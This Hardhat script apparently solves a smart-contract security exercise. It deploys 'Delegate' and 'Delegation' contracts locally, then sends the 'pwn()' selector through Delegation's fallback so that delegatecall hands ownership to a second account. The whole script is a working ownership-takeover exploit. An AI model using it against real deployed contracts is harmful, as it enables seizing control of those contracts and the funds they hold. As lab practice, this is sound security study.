
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1] = await hre.ethers.getSigners();

    console.log("signer0:", signer0.address);
    console.log("signer1:", signer1.address);

    // const c = await hre.ethers.getContractAt("Delegate", "0x034fBACE7a90BC0cBAa9Db9F4245f1211064E1a8", signer0);
    // console.log("Contract owner:", await c.owner());
    // console.log("Contract delegate:", await c.delegate());


    const contract = await hre.ethers.deployContract("Delegate", [signer0.address], signer0);
    const delegationContract = await hre.ethers.deployContract("Delegation", [contract.address], signer0);
    console.log("Contract deployed to address:", delegationContract.address);
    console.log("Contract owner:", await delegationContract.owner());

    const contract1 = await hre.ethers.getContractAt("Delegation", delegationContract.address, signer1);
    const testContract = await hre.ethers.deployContract("TestDelegation", signer1);

    console.log(await testContract.getSelector("pwn()"));

    const r = await signer1.sendTransaction({
        to: contract1.address,
        data: await testContract.getSelector("pwn()")
    });
    await r.wait();

    console.log("Contract owner:", await delegationContract.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
